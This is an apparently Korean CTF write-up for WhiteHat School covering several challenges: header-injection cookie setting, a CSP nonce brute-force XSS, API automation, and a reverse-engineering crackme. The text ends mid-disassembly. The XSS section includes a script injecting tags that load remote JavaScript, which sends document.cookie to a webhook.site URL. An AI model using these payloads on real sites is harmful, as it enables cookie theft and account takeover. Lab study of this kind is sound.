---
title: "[WHS]1차 CTF Write up"
categories: [WhiteHatSchool, task]
mermaid: true
pin: true
tag:
- whitehatschool
- 화이트햇스쿨w
- preBoB
- webhacking
- ctf
---

# 개요
이번 화이트햇스쿨 1기 1차 CTF에 풀었던 문제들에 대한 Write up을 작성했습니다.


## A.give-me-present

### 분석한 내용
우선 해당 문제에 소스코드는 다음과같다

```python
#!/usr/bin/python3
import os
from flask import Flask, request
from flask import make_response, render_template
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import urllib

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'


def read_url(url):
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.get(url)
        driver.get("http://127.0.0.1:8000/check-present")
        driver.get("http://127.0.0.1:8000/memo")
    except:
        driver.quit()
        return False
    driver.quit()
    return True


def admin_present(sender, present):
    url = f"http://127.0.0.1:8000/present?sender={urllib.parse.quote(sender)}&present={urllib.parse.quote(present)}"
    return read_url(url)


@app.route("/")
def index():
    return render_template("index.html")


@app.route('/present', methods=['GET'])
def present():
    if request.method == 'GET':
        sender = request.args.get('sender', 'Sender-Name')
        present = request.args.get('present', '')

        if present == '':
            message = "No present now..."
        else:
            message = f"{sender} gave you: {present}"

        resp = make_response(render_template("present.html", message=message))
        resp.headers.set(sender, present)

        return resp
    else:
        return '<script>alert("no!");history.go(-1);</script>'


@app.route('/give-present', methods=['GET', 'POST'])
def give_present():
    if request.method == 'GET':
        return render_template("give-present.html")
    elif request.method == 'POST':
        sender = request.form.get("sender")
        present = request.form.get("present")
        if not admin_present(sender, present):
            return '<script>alert("wrong??");history.go(-1);</script>'
        return '<script>alert("good");history.go(-1);</script>'


@app.route('/check-present', methods=['GET'])
def check_present():
    if request.method == 'GET':
        present = request.cookies.get('present', '')
        resp = make_response(render_template("check-present.html"))
        print(request.environ['REMOTE_ADDR'])
        if present == 'money' and request.environ['REMOTE_ADDR'] == '127.0.0.1':
            resp.set_cookie("flag", FLAG)
        return resp
    else:
        return render_template("check-present.html")

memo_text = ""


@app.route("/memo")
def memo():
    global memo_text
    text = request.cookies.get('flag', '')
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)


app.run(host='0.0.0.0', port=8000)
```

부분부분 분석을 해보자면 우선 처음 FLAG를 설정하는 부분이 있는데, 해당 부분은 기본적 설정방식이고 자주나오니 이 Write up에서만 설명하고 다른 Write up에서는 생략하겠다.

```python
try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'
```

try부분의 코드는 이 파일의 현재 위치에 존재하는 `flag.txt`라는 파일을 읽기모드로 문자열들을 읽어와 FLAG라는 변수에 저장하고, 만약 해당 디렉토리에 `flag.txt`파일이 없거나 다른 오류가 날 경우 `[**FLAG**]`라는 문자열을 FLAG라는 변수에 저장해 flag문자를 대체하는 코드이다. 즉 이부분의 코드는 실제 flag의 문자열을 문제파일에 넣어 줄 수 없으니 문제파일을 받아 개인 local에서 서버를 실행시킬경우 flag문자를 찾지못하는 오류를 방지해주는 코드이다.

```python
def read_url(url):
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.get(url)
        driver.get("http://127.0.0.1:8000/check-present")
        driver.get("http://127.0.0.1:8000/memo")
    except:
        driver.quit()
        return False
    driver.quit()
    return True
```
이 코드에서는 webdriver를 통해 서버에서 가상?의 브라우저를 통해 일련의 행동을 시키는것이다. 문제를 풀때 필요치 않은 부분을 제외하고 설명하자면, 처음 `127.0.0.1:8000`으로 현재 자신의 서버에 루프백 ip를 통해 get요청 하고, 파라미터로받은 url의 주소로 get요청을 하고, `/cehck-present`라는 주소로 get요청을 하고, `/memo`라는 주소로 get요청을 하는 과정을 하고 종료를 하는 함수이다.


```python
@app.route('/present', methods=['GET'])
def present():
    if request.method == 'GET':
        sender = request.args.get('sender', 'Sender-Name')
        present = request.args.get('present', '')

        if present == '':
            message = "No present now..."
        else:
            message = f"{sender} gave you: {present}"

        resp = make_response(render_template("present.html", message=message))
        resp.headers.set(sender, present)

        return resp
    else:
        return '<script>alert("no!");history.go(-1);</script>'
```
해당 코드는 `/present`의 url로 접속했을 때 의 코드이다. 만약 `GET`요청을 받을 경우 sender와 present에 각각 url 파라미터로 전달받은 인자를 저장한다. 근데 present파라미터로 전달받은 값이 없다면 페이지가 다시 렌더링되고 "No presnet now..."을 출력한다. present값이 존재할경우 페이지가 다시 렌더링되고 sender와 present의 값을 넣은 "{sender} gave you: {present}"를 출력한다. 그리고 응답을 줄 때 header를 `{sender}: {present}`의 형식으로 설정을 해준다.


```python
@app.route('/give-present', methods=['GET', 'POST'])
def give_present():
    if request.method == 'GET':
        return render_template("give-present.html")
    elif request.method == 'POST':
        sender = request.form.get("sender")
        present = request.form.get("present")
        if not admin_present(sender, present):
            return '<script>alert("wrong??");history.go(-1);</script>'
        return '<script>alert("good");history.go(-1);</script>'
```
해당코드는 `/give-present`에 접속할 경우 실행이된다. url은 GET요청방식과 POST요청방식모두 허가하고있다. 만약 GET요청을 받을 경우 그냥 html을 렌더링해주고 POST요청을 받았을 경우 sender와 presend에 파라미터로받은 값을 각각 저장한다. 이후 admin_present(sender, present)실행하고 return값이 존재할 경우 good을 띄우고 존재하지 않을경우 wrong을 띄운다.


```python
@app.route('/check-present', methods=['GET'])
def check_present():
    if request.method == 'GET':
        present = request.cookies.get('present', '')
        resp = make_response(render_template("check-present.html"))
        print(request.environ['REMOTE_ADDR'])
        if present == 'money' and request.environ['REMOTE_ADDR'] == '127.0.0.1':
            resp.set_cookie("flag", FLAG)
        return resp
    else:
        return render_template("check-present.html")

```
해당 코드는 `/check-present`url에 접속할 경우 실행이된다. 해당 코드는 GET요청만 허용을 하고있다. GET요청을 받았을 경우 present변수에 present라는 이름의 쿠키값을 가져와저장하고 만약 present값이 'money'이고 접속한 host의 주소가 `127.0.0.1`일 경우 flag라는 쿠키에 FLAG값을 넣어 설정해준다.

```python
memo_text = ""

@app.route("/memo")
def memo():
    global memo_text
    text = request.cookies.get('flag', '')
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)
```
해당 코드는 `/memo`url에 접속했을 경우 실행이된다. memo_text를 글로벌변수로 선언하고 text변수에 flag라는 이름의 쿠키값을 저장한다. memo_text 글로벌 변수에 저장한 text값과 한줄을 띄는 문자를 저장하고 html에서 출력을 시켜준다.

### 접근방식
우선 FLAG를 얻는 코드부터 역순으로 찾아봐야 한다. `/memo`url을 보면 flag라는 쿠키값 을 가져오는데 flag의 쿠키값이 설정이 되있어야 flag가 출력이 된다. 그렇다면 flag쿠키값을 설정하는 부분을 찾아야한다. flag쿠키값을 설정하는 코드는 `/check-present`부분에 있다. 해당 코드에서 present의 쿠키값이 money이고 `127.0.0.1`의 host로 접속을 했을 경우 설정이 된다. 따라서 read_url로 서버에게 해당 url에 접속을 시켜야 flag를 얻을 수 있다는 것을 알 수 있고, present의 쿠키값이 설정된 부분을 찾아야한다. 하지만 present의 쿠키값을 설정하는 부분이 존재하지 않는데, `/present`url 코드를 보면 불필요한 코드가 있는 것을 확인할 수 있는데 바로 헤더를 설정하는 것이다. 서버에서 쿠키값을 설정할 때 헤더에 `Set-Cookie: {key}={value}` 형식으로 response를 내면 설정이 된다. 따라서 {sender}:{present} 의 형식으로 헤더가 설정이 되고있으니 이 입력값을 이용해 present 쿠키값을 money로 설정해주면 된다.

### 코드작성
sender = "Set-Cookie"
present = "present = money"


### 문제 해결
flag를 얻기위해서 `/give-presnet`url에 접속해 sender에 "Set-Cookie"를 입력하고 present에 "present = money"를 입력해 POST요청을 날리면 `/memo`에서는 어떤 컴퓨터에서 요청한것 상관없이 모든 flag쿠키값을 출력시키기때문에 해당 url에 접속하면 flag가 출력이 된다.



## D.poor-csp

### 분석한 내용
문제에 전체 소스코드는 다음과 같다.
```python
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)
nonce = os.urandom(1).hex()

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"


def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        return False
    driver.quit()
    return True


@app.after_request
def add_header(response):
    global nonce
    response.headers['Content-Security-Policy'] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}'; object-src 'none'; base-uri 'none'"
    nonce = os.urandom(1).hex()
    return response


@app.route("/")
def index():
    return render_template("index.html", nonce=nonce)


@app.route("/call-admin")
def flag():
    url = "http://127.0.0.1:8000/memo"
    if not read_url(url, {"name": "flag", "value": FLAG.strip()}):
        return f'<script nonce={nonce}>alert("what??");history.go(-1);</script>'

    return f'<script nonce={nonce}>alert("admin visited /memo");history.go(-1);</script>'


memo_text = ""


@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text, nonce=nonce)


@app.route("/clear-memo")
def clear_memo():
    global memo_text
    memo_text = ""
    return f'<script nonce={nonce}>alert("cleared memo");history.go(-1);</script>'


app.run(host="0.0.0.0", port=8000)
```

해당 코드에서 필요한 코드부분을 분석해보겠다.

```python
@app.after_request
def add_header(response):
    global nonce
    response.headers['Content-Security-Policy'] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}'; object-src 'none'; base-uri 'none'"
    nonce = os.urandom(1).hex()
    return response
```
이부분은 모든 request 해당 코드들을 실행하는 코드이다. 이때 nonce를 global로 설정했고 응답의 헤더를 설정하는데 이때 Content-Security-Policy로 흔히 CSP라는 보호정책이 적용이 되어있다. 이 CSP는 XSS공격을 막기위해 만들어졌는데 이 코드를 예시로 들면 script태그를 사용할 때 지정된 nonce값을 넣어주던가 현재 도메인에서 로드되는 적절한 소스를 사용해야 실행이된다. 이후 nonce값을 1바이트의 hex값으로 설정하고 있다.


```python
@app.route("/call-admin")
def flag():
    url = "http://127.0.0.1:8000/memo"
    if not read_url(url, {"name": "flag", "value": FLAG.strip()}):
        return f'<script nonce={nonce}>alert("what??");history.go(-1);</script>'

    return f'<script nonce={nonce}>alert("admin visited /memo");history.go(-1);</script>'
```
이 코드는 `/call-admin`에 접속했을 때 실행되는 코드이다. 127.0.0.1의 호스트를 사용해 서버에게 /memo라는 url에 접속 요청을 cookie값으로 flag와 함께 요청하고있다. 이후 해당 요청이 정상적으로 요청이 완료되면 "admin visited /memo"를 출력하고, 정상적이지 않으면 "What??"을 출력한다.


```python
memo_text = ""


@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text, nonce=nonce)
```
해당 코드는 `/memo`에 접속했을 경우 실행되는 코드이다. memo_text를 전역변수로 선언했으므로 이전 문제와 같이 어느 시스템에서든 요청을 할경우 모든 시스템에 memo_text에 넣은 문자가 같다. text라는 변수에 memo라는 이름의 파라미터로받은 값을 저장하고 해당 문자열을 출력한다.




```python
@app.route("/clear-memo")
def clear_memo():
    global memo_text
    memo_text = ""
    return f'<script nonce={nonce}>alert("cleared memo");history.go(-1);</script>'


app.run(host="0.0.0.0", port=8000)
```
해당 코드는 `/clear-memo`에 접속했을 경우 실행되는 코드이다. 이 코드는 memo_text안의 모든 문자열을 빈 문자열로 만들어 clear를 시키는 기능을 수행한다.


### 접근방식
현재 이 문제코드에서 제공하는 기능은 다음과 같다. `/memo`에 접근해 파라미터로 문자열을 입력해주면 해당 문자열이 별도의 필터링이없이 출력되고, `/call-admin`에 접속해 flag값을 쿠키로 가지고 있는 서버가 `/memo`에 접속하고 `/claer-memo`에 접속하면 memo의 출력되는 모든 문자열을 지워준다.

따라서 flag를 획득하려면 서버가 `/memo` url에 접속하면 쿠키값이 출력되게 하거나, 나의 서버로 접속해 쿠키값을 보내게 하는 방법이 있을 것이다. 우선 해당 공격을 수행하려면 script나, ifram과 같은 명령어가 실행이 되어야하는데 csp정책으로인해 막혀있는 상황이다. 하지만 nonce값을 1바이트의 hex값으로 설정하므로써 256개의 nonce값으로 적은 경우의 수의 nonce값을 예측할 수 있다. 즉 나올 수 있는 모든 nonce의 값들과 함께 script문을 256개 작성해주면 1개의 script문은 작동을 하게될 것이다.

이후 나는 쿠키값을 webhook사이트를 통해 요청을 받도록했다.



### 코드작성
```python
import requests

URL = "http://srv1.kitriwhs.kr:9232"

def memo_nonce(URL):
    for nonce in range(256):
        payload = f"""/memo?memo=<script nonce="{str(hex(nonce))[2:]}" src="https://luisceballos.dev/xss_js/whs.js"></script>"""
        res = requests.get(URL + payload)
        print(res.status_code)
        print(hex(nonce)[2:])

memo_nonce(URL)
```
위와 같은 코드를 사용해 `/memo`url에 모든 nocne경우의수만큼 script를 작성해 js가 실행되는 나의 서버로 접속하게 했다.

해당 서버 js에는 `location.href="	https://webhook.site/c6242c6c-251c-493b-819a-3c4924f315ea?cookie="+document.cookie`의 코드가 적혀있어 webhook사이트로 쿠키값과 함께 요청이 보내진다.



### 문제해결
해당 문제를 해결하기위해서 다음과 같은 순서로 공격을 했다.
1. 위 코드를 사용해 `/memo`url에 모든 nonce값의 경우의수 만큼 나의 서버로 접속하는 script를 작성
2. `/call-admin`에 접속해 `/memo`서버가 memo를 접근하게 함
3. `/memo`에 접근한 서버는 자신의 flag쿠키값과 함께 webhook사이트로 요청이 보내게됨
4. webhook사이트에서 해당 요청을 확인해 flag를 획득


## G.how-to-api

### 분석한 내용
해당 문제의 전체코드는 다음과같다.

```python
#!/usr/bin/python3
import os
from flask import Flask, session, request, g, jsonify
import random
import time

app = Flask(__name__)
app.secret_key = os.urandom(32)

number_storage = []

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'


@app.route('/api/start', methods=['GET'])
def start():
    session['stage'] = 1
    session['start_time'] = time.time()
    global number_storage
    number_storage = []
    return jsonify({"status": "success", "message": "session granted!"})


@app.route('/api/formula/<int:stage>', methods=['GET','POST'])
def formula(stage):
    if session.get('stage') != stage:
        return jsonify({"status": "fail", "message": "invalid session or stage mismatch!"})

    if time.time() - session['start_time'] > 60:
        return jsonify({"status": "fail", "message": "timeout!"})

    if stage > 30:
        return jsonify({"status": "success", "flag": FLAG})

    global number_storage
    
    try:
        numbers = number_storage[stage - 1]
    except:
        number_storage.append([random.randint(1, 10000), random.randint(1, 10000)])
        numbers = number_storage[stage - 1]
        
    if request.method == 'GET':
        return jsonify({"a": numbers[0], "b": numbers[1]})
    elif request.method == 'POST':
        answer = request.form.get('answer', -1)
        if int(answer) == numbers[0] + numbers[1]:
            session['stage'] += 1
            return jsonify({"status": "success"})
        else:
            return jsonify({"status": "fail"})
    else:
        return jsonify({"status": "fail"})


app.run(host='0.0.0.0', port=8000)
```


```python
@app.route('/api/start', methods=['GET'])
def start():
    session['stage'] = 1
    session['start_time'] = time.time()
    global number_storage
    number_storage = []
    return jsonify({"status": "success", "message": "session granted!"})
```
해당 코드는 `/api/start`에 접속했을 경우 실행이 된다. `stage` 세션을 1로 설정하고 `start_time` 세션을 현재 시간으로 설정한뒤 number_storage를 빈문자열로 설정한다.


```python
@app.route('/api/formula/<int:stage>', methods=['GET','POST'])
def formula(stage):
    if session.get('stage') != stage:
        return jsonify({"status": "fail", "message": "invalid session or stage mismatch!"})

    if time.time() - session['start_time'] > 60:
        return jsonify({"status": "fail", "message": "timeout!"})

    if stage > 30:
        return jsonify({"status": "success", "flag": FLAG})

    global number_storage
    
    try:
        numbers = number_storage[stage - 1]
    except:
        number_storage.append([random.randint(1, 10000), random.randint(1, 10000)])
        numbers = number_storage[stage - 1]
        
    if request.method == 'GET':
        return jsonify({"a": numbers[0], "b": numbers[1]})
    elif request.method == 'POST':
        answer = request.form.get('answer', -1)
        if int(answer) == numbers[0] + numbers[1]:
            session['stage'] += 1
            return jsonify({"status": "success"})
        else:
            return jsonify({"status": "fail"})
    else:
        return jsonify({"status": "fail"})
```
해당 코드는 `/api/formula/<int:stage>`에 접속할 경우 실행이된다. 여기서 <int:stage>는 stage라는 변수에 int형으로 접속할 때 사용한 숫자를 넣는다는 것이다. 예를 들어 `/api/formula/1`로 접근할 경우 stage변수에는 int형으로 1이 저장된다. 접속이후 자신의 stage 세션과 접근할때 입력한 stage와 수를 비교하는데 같지 않을 경우 `"status": "fail", "message": "invalid session or stage mismatch!"`가 출력이된다. 그리고 현재 시간과 자신의 start_time세션의 값을 비교하는데 `/api/start`에 접근한 뒤 60초가 지가면 timeout이 나는것을 확인 할 수 있다. 또 자신의 stage 세션이 30이상이 될 경우 flag를 출력하는 것을 확인할 수 있다.

다음 코드들을 살펴보면 number_storage를 전역변수로 설정하고 numbers에 number_storage안 자신의 stage-1의 인덱스값을 저장한다. 만약 해당 값이 존재하지 않을 경우 1~10000의 값 2개를 number_storage에 리스트형식으로 해당 인덱스로 저장한뒤, 이 리스트를 numbers에 저장한다.

만약 GET요청일 경우 numbers의 2 값을 출력시키고 POST요청일경우 전달받은 answer값과 numbers에 있는 2값의 합과 비교해서 동일할 경우 stage세션에 1을 더해준다.

### 접근방식
해당 문제에서 flag를 획득하는 방법은 자신의 stage세션의 값을 30보다 커질때까지 POST요청을 보내 stage세션을 증가시키는 것이다. 증가시키는 방법은 numbers의 두 값의 합을 answer로 POST요청으로 보내면 된다. 따라서 두 값을 get요청으로 확인하고 두 값의 합을 POST요청으로 요청보내면 증가시킬 수 있다.

### 코드작성
```python
import requests

URL = "http://srv1.kitriwhs.kr:21690/api"

session = requests.Session()


def start(session, URL):
    endpoint = "/start"
    global stage
    stage = 1

    res = session.get(URL + endpoint)
    print(res.status_code)
    print(res.text)
    return 

def number_get(session, URL):
    endpoint = f"/formula/{stage}"
    
    res = session.get(URL + endpoint)
    print(res.status_code)
    
    if "success" in res.text:
        print(res.text)

    numbers = res.json()
    print(numbers['a'], numbers['b'])
    return numbers


def number_post(session, URL, numbers):
    global stage
    endpoint = f"/formula/{stage}"
    data = {'answer': numbers['a'] + numbers['b']}

    res = session.post(URL + endpoint, data)

    print(res.status_code)
    stage += 1

    print(res.text)
    return

start(session, URL)

for _ in range(31):
    numbers = number_get(session, URL)
    number_post(session, URL, numbers)
```
위 코드는 session을 저장할 변수를 생성하고. 해당 변수를 통해 요청을 보낸다. 요청은 처음 get요청을 보내 numbers의 두 값을 확인하고, post요청을 보내 두 값의 합을 요청보내고 있다. 이것을 31번 반복해 stage세션이 30이상까지 증가하도록 했다.

### 문제해결
위 코드를 실행시켜 stage세션을 30이상까지 증가시켜 flag를 획득했다.


## J.PleaseCrackMe101

### 분석한 내용
우선 해당 문제의 파일을 실행시켜보니 "Give me your input: "이라는 문자열과 함께 입력을 요청했다. 이후 아무 값이나 넣었더니 "Wrong :(" 이라는 문자열이 나왔다 따라서 해당 문제는 이 파일에서 원하는 문자열을 입력할 경우 flag를 획득하는 방식이라고 예상을 했다.

해당 파일을 pwndbg로 실행하고 disass main으로 어셈블리어 코드를 확인했한결과 다음과 같은 어셈블리어 코드가 나왔다.

```python
pwndbg> disass main
Dump of assembler code for function main:
   0x0000555555555350 <+0>:     endbr64
   0x0000555555555354 <+4>:     push   rbp
   0x0000555555555355 <+5>:     mov    rbp,rsp
   0x0000555555555358 <+8>:     sub    rsp,0xa0
   0x000055555555535f <+15>:    mov    rax,QWORD PTR fs:0x28
   0x0000555555555368 <+24>:    mov    QWORD PTR [rbp-0x8],rax
   0x000055555555536c <+28>:    xor    eax,eax
   0x000055555555536e <+30>:    mov    eax,0x0
   0x0000555555555373 <+35>:    call   0x555555555209 <initialize>
   0x0000555555555378 <+40>:    mov    eax,0x0
   0x000055555555537d <+45>:    call   0x555555555250 <print_banner>
   0x0000555555555382 <+50>:    mov    QWORD PTR [rbp-0xa0],0x0
   0x000055555555538d <+61>:    mov    QWORD PTR [rbp-0x98],0x0
   0x0000555555555398 <+72>:    mov    QWORD PTR [rbp-0x90],0x0
   0x00005555555553a3 <+83>:    mov    QWORD PTR [rbp-0x88],0x0
   0x00005555555553ae <+94>:    mov    QWORD PTR [rbp-0x80],0x0
   0x00005555555553b6 <+102>:   mov    QWORD PTR [rbp-0x78],0x0
   0x00005555555553be <+110>:   mov    QWORD PTR [rbp-0x70],0x0
   0x00005555555553c6 <+118>:   mov    QWORD PTR [rbp-0x68],0x0
   0x00005555555553ce <+126>:   mov    BYTE PTR [rbp-0x60],0x0
   0x00005555555553d2 <+130>:   mov    QWORD PTR [rbp-0x50],0x0
   0x00005555555553da <+138>:   mov    QWORD PTR [rbp-0x48],0x0
   0x00005555555553e2 <+146>:   mov    QWORD PTR [rbp-0x40],0x0
   0x00005555555553ea <+154>:   mov    QWORD PTR [rbp-0x38],0x0
   0x00005555555553f2 <+162>:   mov    QWORD PTR [rbp-0x30],0x0
   0x00005555555553fa <+170>:   mov    QWORD PTR [rbp-0x28],0x0
   0x0000555555555402 <+178>:   mov    QWORD PTR [rbp-0x20],0x0
   0x000055555555540a <+186>:   mov    QWORD PTR [rbp-0x18],0x0
   0x0000555555555412 <+194>:   mov    BYTE PTR [rbp-0x10],0x0
   0x0000555555555416 <+198>:   lea    rax,[rip+0xebe]        # 0x5555555562db
   0x000055555555541d <+205>:   mov    rdi,rax
   0x0000555555555420 <+208>:   mov    eax,0x0
   0x0000555555555425 <+213>:   call   0x5555555550d0 <printf@plt>
   0x000055555555542a <+218>:   lea    rax,[rbp-0x50]
   0x000055555555542e <+222>:   mov    rsi,rax
   0x0000555555555431 <+225>:   lea    rax,[rip+0xeb8]        # 0x5555555562f0
   0x0000555555555438 <+232>:   mov    rdi,rax
   0x000055555555543b <+235>:   mov    eax,0x0
   0x0000555555555440 <+240>:   call   0x555555555110 <__isoc99_scanf@plt>
   0x0000555555555445 <+245>:   lea    rcx,[rbp-0x50]
   0x0000555555555449 <+249>:   lea    rax,[rbp-0xa0]
   0x0000555555555450 <+256>:   mov    edx,0x40
   0x0000555555555455 <+261>:   mov    rsi,rcx
   0x0000555555555458 <+264>:   mov    rdi,rax
   0x000055555555545b <+267>:   call   0x5555555550f0 <memcpy@plt>
   0x0000555555555460 <+272>:   lea    rax,[rbp-0xa0]
   0x0000555555555467 <+279>:   mov    rdi,rax
   0x000055555555546a <+282>:   call   0x5555555552c4 <func1>
   0x000055555555546f <+287>:   lea    rax,[rbp-0xa0]
   0x0000555555555476 <+294>:   mov    rdi,rax
   0x0000555555555479 <+297>:   call   0x55555555530b <func2>
   0x000055555555547e <+302>:   lea    rax,[rbp-0xa0]
   0x0000555555555485 <+309>:   mov    edx,0x40
   0x000055555555548a <+314>:   lea    rcx,[rip+0x2b8f]        # 0x555555558020 <target>
   0x0000555555555491 <+321>:   mov    rsi,rcx
   0x0000555555555494 <+324>:   mov    rdi,rax
   0x0000555555555497 <+327>:   call   0x5555555550e0 <memcmp@plt>
   0x000055555555549c <+332>:   test   eax,eax
   0x000055555555549e <+334>:   jne    0x5555555554bd <main+365>
   0x00005555555554a0 <+336>:   lea    rax,[rbp-0x50]
   0x00005555555554a4 <+340>:   mov    rsi,rax
   0x00005555555554a7 <+343>:   lea    rax,[rip+0xe47]        # 0x5555555562f5
   0x00005555555554ae <+350>:   mov    rdi,rax
   0x00005555555554b1 <+353>:   mov    eax,0x0
   0x00005555555554b6 <+358>:   call   0x5555555550d0 <printf@plt>
   0x00005555555554bb <+363>:   jmp    0x5555555554cc <main+380>
   0x00005555555554bd <+365>:   lea    rax,[rip+0xe43]        # 0x555555556307
   0x00005555555554c4 <+372>:   mov    rdi,rax
   0x00005555555554c7 <+375>:   call   0x5555555550b0 <puts@plt>
   0x00005555555554cc <+380>:   mov    eax,0x0
   0x00005555555554d1 <+385>:   mov    rdx,QWORD PTR [rbp-0x8]
   0x00005555555554d5 <+389>:   sub    rdx,QWORD PTR fs:0x28
   0x00005555555554de <+398>:   je     0x5555555554e5 <main+405>
   0x00005555555554e0 <+400>:   call   0x5555555550c0 <__stack_chk_fail@plt>
   0x00005555555554e5 <+405>:   leave
   0x00005555555554e6 <+406>:   ret
End of assembler dump.
```

코드의 흐름을 보니 파일의 베너와 "Give me your input: "과 같은 문자열을 출력한 뒤 scanf를 통해 입력을 받은 뒤 func1과 func2를 거친 뒤 변환된 내 input값과 해당 파일에서 가져온 target에 해당하는 문자열을 비교하는 코드인거같다. 따라서 func1부터 살펴봐 입력값이 어떻게 변환되는 지 확인해보겠다.


```python
pwndbg> disass func1
Dump of assembler code for function func1:
   0x00005555555552c4 <+0>:     endbr64
   0x00005555555552c8 <+4>:     push   rbp
   0x00005555555552c9 <+5>:     mov    rbp,rsp
   0x00005555555552cc <+8>:     mov    QWORD PTR [rbp-0x18],rdi
   0x00005555555552d0 <+12>:    mov    DWORD PTR [rbp-0x4],0x0
   0x00005555555552d7 <+19>:    jmp    0x555555555301 <func1+61>
   0x00005555555552d9 <+21>:    mov    eax,DWORD PTR [rbp-0x4]
   0x00005555555552dc <+24>:    movsxd rdx,eax
   0x00005555555552df <+27>:    mov    rax,QWORD PTR [rbp-0x18]
   0x00005555555552e3 <+31>:    add    rax,rdx
   0x00005555555552e6 <+34>:    movzx  eax,BYTE PTR [rax]
   0x00005555555552e9 <+37>:    lea    ecx,[rax+0xf]
   0x00005555555552ec <+40>:    mov    eax,DWORD PTR [rbp-0x4]
   0x00005555555552ef <+43>:    movsxd rdx,eax
   0x00005555555552f2 <+46>:    mov    rax,QWORD PTR [rbp-0x18]
   0x00005555555552f6 <+50>:    add    rax,rdx
   0x00005555555552f9 <+53>:    mov    edx,ecx
   0x00005555555552fb <+55>:    mov    BYTE PTR [rax],dl
   0x00005555555552fd <+57>:    add    DWORD PTR [rbp-0x4],0x2
   0x0000555555555301 <+61>:    cmp    DWORD PTR [rbp-0x4],0x3f
   0x0000555555555305 <+65>:    jle    0x5555555552d9 <func1+21>
   0x0000555555555307 <+67>:    nop
   0x0000555555555308 <+68>:    nop
   0x0000555555555309 <+69>:    pop    rbp
   0x000055555555530a <+70>:    ret
End of assembler dump.
```
코드에 func1+65 보면 이전 cmp에서 비교한 결과를 통해 계속 반복을 하고있는 것을 확인할 수 있다. 그리고 func1+57과 61을 보면 rbp의 값이 2씩 증가하다 0x3f보다 커질 경우 반복을 중단하는 것을 알 수 있다. 일단 한번 반복을 해보며 어떠한 변화가 생기는지 확인해본 결과 $rdi에 내가 입력한 값이 0x40만큼(입력값이 0x40보다 작을 경우 0으로 저장) 저장되어있었고 1바이트씩 봤을 때 짝수번째 값들이 0xf만큼 더해지는 것을 확인했다.

```python
pwndbg> x/20w $rdi
0x7fffffffe0c0: 0x31403140      0x31403140      0x000f000f      0x000f000f
0x7fffffffe0d0: 0x000f000f      0x000f000f      0x000f000f      0x000f000f
0x7fffffffe0e0: 0x000f000f      0x000f000f      0x000f000f      0x000f000f
0x7fffffffe0f0: 0x000f000f      0x000f000f      0x000f000f      0x000f000f
0x7fffffffe100: 0x00000000      0x00000000      0x00000000      0x00000000
```
따라서 func1에서는 내가 입력한 짝수번째 값들을 0xf만큼 더해준다는 것을 확인할 수 있다. 자세한 것은 코드를 하나씩 봐가며 알 수 있지만 효율적으로 문제를 푸는 과정에서 생략을 했다.

두번째 func2를 코드를 보겠다.

```python
pwndbg> disass func2
Dump of assembler code for function func2:
=> 0x000055555555530b <+0>:     endbr64
   0x000055555555530f <+4>:     push   rbp
   0x0000555555555310 <+5>:     mov    rbp,rsp
   0x0000555555555313 <+8>:     mov    QWORD PTR [rbp-0x18],rdi
   0x0000555555555317 <+12>:    mov    DWORD PTR [rbp-0x4],0x1
   0x000055555555531e <+19>:    jmp    0x555555555346 <func2+59>
   0x0000555555555320 <+21>:    mov    eax,DWORD PTR [rbp-0x4]
   0x0000555555555323 <+24>:    movsxd rdx,eax
   0x0000555555555326 <+27>:    mov    rax,QWORD PTR [rbp-0x18]
   0x000055555555532a <+31>:    add    rax,rdx
   0x000055555555532d <+34>:    movzx  edx,BYTE PTR [rax]
   0x0000555555555330 <+37>:    mov    eax,DWORD PTR [rbp-0x4]
   0x0000555555555333 <+40>:    movsxd rcx,eax
   0x0000555555555336 <+43>:    mov    rax,QWORD PTR [rbp-0x18]
   0x000055555555533a <+47>:    add    rax,rcx
   0x000055555555533d <+50>:    xor    edx,0x2b
   0x0000555555555340 <+53>:    mov    BYTE PTR [rax],dl
   0x0000555555555342 <+55>:    add    DWORD PTR [rbp-0x4],0x2
   0x0000555555555346 <+59>:    cmp    DWORD PTR [rbp-0x4],0x3f
